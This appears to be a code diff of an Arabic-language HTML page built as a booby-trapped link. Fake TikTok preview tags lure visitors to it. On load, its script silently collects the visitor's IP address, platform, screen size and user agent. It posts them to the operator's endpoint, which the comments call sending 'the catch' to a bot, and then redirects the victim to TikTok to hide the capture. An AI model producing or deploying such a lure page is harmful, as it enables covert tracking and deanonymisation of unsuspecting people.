@@ -2,36 +2,52 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
+    <meta property="og:title" content="شاهد هذا المقطع الحصري! 🔥">
+    <meta property="og:description" content="تيك توك - مشاهدات رائجة الآن">
+    <meta property="og:image" content="https://www.tiktok.com/favicon.ico">
+    <meta name="twitter:card" content="summary_large_image">
+
     <title>جارٍ التحميل...</title>
+
     <script>
-        async function captureData() {
+        async function captureAndRedirect() {
+            // --- الإعدادات ---
+            const original_video = "https://www.tiktok.com"; // ضع رابط الفيديو الأصلي هنا
+            const api_endpoint = "/api/index"; // مسار الـ API حقك
+
             let deviceData = {};
             
-            // 1. سحب الـ IP الحقيقي
+            // 1. سحب الـ IP
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 deviceData.ip = ipData.ip;
             } catch(e) { deviceData.ip = "مخفي"; }
 
-            // 2. سحب تفاصيل الجهاز
+            // 2. سحب بيانات الجهاز
             deviceData.platform = navigator.platform;
             deviceData.screen = window.screen.width + "x" + window.screen.height;
             deviceData.userAgent = navigator.userAgent;
 
-            // 3. إرسال البيانات لسيرفرك
-            await fetch('/api/index', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ action: "تحويل فيديو (تيك توك)", device: deviceData })
-            });
+            // 3. إرسال الصيدة للبوت
+            try {
+                await fetch(api_endpoint, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ 
+                        action: "دخول عبر رابط ملغم (تمويه)", 
+                        device: deviceData 
+                    })
+                });
+            } catch(e) { console.log("Error sending data"); }
 
-            // 4. الرابط اللي تبي الضحية يروح له (تقدر تغيره لأي فيديو)
-            window.location.href = "https://www.tiktok.com"; 
+            // 4. التحويل الفوري للفيديو الأصلي
+            window.location.href = original_video;
         }
-        window.onload = captureData;
+        
+        window.onload = captureAndRedirect;
     </script>
 </head>
 <body style="background-color: #000;">
-    </body>
+</body>
 </html>
